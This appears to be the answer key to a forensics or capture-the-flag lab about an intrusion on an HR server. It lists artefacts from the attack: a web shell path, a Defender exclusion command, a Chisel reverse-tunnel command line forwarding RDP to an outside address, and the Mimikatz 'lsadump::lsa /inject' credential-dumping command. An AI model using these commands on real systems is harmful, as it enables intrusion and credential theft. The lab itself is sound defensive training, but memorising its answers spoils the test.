@@ -1,0 +1,23 @@
+1. No answer needed
+2. 1102
+3. 1. Salary Raise Approver v0.1
+   2. 10.10.23.190
+   3. C:\Apache24\htdocs\uploads\search.php
+   4. Web Shell
+4. 1. whoami
+   2. http://10.10.23.190:8080/httpd-proxy.exe
+   3. Add-MpPreference -ExclusionPath C:\Apache24
+   4. RDP
+5. 1. 2025-01-23 17:00:12
+   2. HR01-SRV\Administrator
+   3. 10.10.23.190
+   4. 2025-01-23 17:16:46
+6. 1. Apache Proxy
+   2. 2025-01-23 17:05:37
+   3. At system startup
+   4. C:\Apache24\bin\httpd-proxy.exe client 10.10.23.190:10443 R:3389:127.0.0.1:3389
+7. 1. VirTool:Win64/Chisel.G
+   2. HackTool:Win32/Mimikatz!pz
+   3. mimi.exe
+   4. lsadump::lsa /inject
+8. No answer needed
